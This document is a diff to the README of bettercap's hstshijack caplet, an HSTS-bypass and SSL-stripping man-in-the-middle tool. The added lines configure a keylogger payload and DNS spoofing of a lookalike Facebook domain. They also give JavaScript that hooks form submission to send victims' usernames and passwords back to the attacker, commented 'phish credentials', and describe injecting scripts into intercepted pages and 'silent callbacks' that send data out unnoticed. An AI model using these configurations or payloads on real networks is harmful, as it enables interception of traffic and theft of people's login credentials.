@@ -13,24 +13,24 @@ set hstshijack.replacements    facedook.com,*.facedook.com
 set hstshijack.blockscripts    facebook.com,*.facebook.com
 set hstshijack.obfuscate       false
 set hstshijack.encode          true
-set hstshijack.custompayloads  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js
+set hstshijack.custompayloads  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
 
 set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
-#set net.sniff.output   hstshijack0001.pcap
-set net.sniff.verbose  false
-net.sniff   on
+set dns.spoof.domains  facedook.com,*.facedook.com
+
 http.proxy  on
+dns.spoof   on
 ```
 
 ### Core payload
 
-This module injects HTML & JS files with a payload (<a href="./payloads/hstshijack-payload.js">**hstshijack-payload.js**</a>) that communicates with this module, revealing all URLs that are discovered in the injected document.
+This module injects HTML & JS files with a payload (<a href="./payloads/hstshijack-payload.js">**hstshijack-payload.js**</a>) that communicates with bettercap, revealing all URLs that were discovered in the injected document.
 
-This is done in separate and asynchronous requests so that the bettercap proxy can adjust the host and path for each request, and send a HEAD request to learn each host's response headers for a HTTP request.
+This is done in separate and asynchronous requests so that the bettercap proxy can adjust the host and path for each request, in order to send a HEAD request to learn each host's response to a HTTP request.
 
 ### Custom payloads
 
-You can also inject your own JavaScript payload(s) into HTML & JS files from targeted hosts by assigning them to the `hstshijack.custompayloads` variable.
+You can also inject your own JavaScript payloads into HTML & JS files from targeted hosts by assigning them to the `hstshijack.custompayloads` variable.
 
 Example:
 
@@ -63,7 +63,7 @@ Will be injected as:
 
 ```js
 function jfIleNwmKoa() {
-  alert("Random variable: AsjZnJWklwMNqshCaloE")
+  alert("Random variable: AsjZnJW")
 }
 
 jfIleNwmKoa()
@@ -77,7 +77,7 @@ To enable payload encoding, set `hstshijack.encode` to `true`.
 
 ### Silent callbacks
 
-You can write custom payloads that communicate with bettercap without alerting the host.
+You can write custom payloads that send data to bettercap without alerting the host.
 
 Example of a silent callback:
 
@@ -88,11 +88,47 @@ form.onsubmit = function() {
   req.send()
 }
 ```
-<sup>Note: Every instance of `obf_path_callback` will be replaced with the callback path & every instance of `obf_path_ssl_log` will be replaced with the SSL log path.</sup>
+<sup>Note: Every instance of `obf_path_callback` will be replaced with the callback path, every instance of `obf_path_whitelist` will be replaced with the whitelist path, and every instance of `obf_path_ssl_log` will be replaced with the SSL log path.</sup>
 
 The code above will send a POST request that will be sniffed by bettercap, but not proxied. 
 
 As soon as bettercap receives a silent callback, any request for the targeted host will no longer be spoofed for that client.
+
+### Whitelisting callbacks
+
+You can stop attacking a client on a certain host when you receive a request from that client for the whitelist path. The whitelist path will be inserted wherever you have `obf_path_whitelist` written in your payloads (`/` will not be written).
+
+Example of whitelisting callbacks:
+
+```js
+// Whitelist multiple domains
+
+form.onsubmit = function() {
+  // Whitelist current hostname and phish credentials
+  req = new XMLHttpRequest()
+  req.open("POST", "http://" + location.hostname + "/obf_path_whitelist?username=" + username + "&password=" + password)
+  req.send()
+
+  // Whitelist facebook
+  req = new XMLHttpRequest()
+  req.open("POST", "http://facedook.com/obf_path_whitelist")
+  req.send()
+
+  // Whitelist facebook CDN
+  req = new XMLHttpRequest()
+  req.open("POST", "http://static.xx.fdcdn.net/obf_path_whitelist")
+  req.send()
+
+  // Whitelist redirect to facebook
+  req = new XMLHttpRequest()
+  req.open("POST", "http://fd.com/obf_path_whitelist")
+  req.send()
+}
+```
+
+When the bettercap proxy receives such a request, it will stop attacking clients on the requested (original and spoofed) host. If a spoofed location is requested that was whitelisted, the client will then be redirected to the intended location.
+
+Note that if the hostnames you are whitelisting are HSTS preloaded, you have to send the whitelist callback to the spoofed hostnames, otherwise the browser will enforce a HTTPS connection, and bettercap will not be able to intercept the requests.
 
 ### Block scripts
 
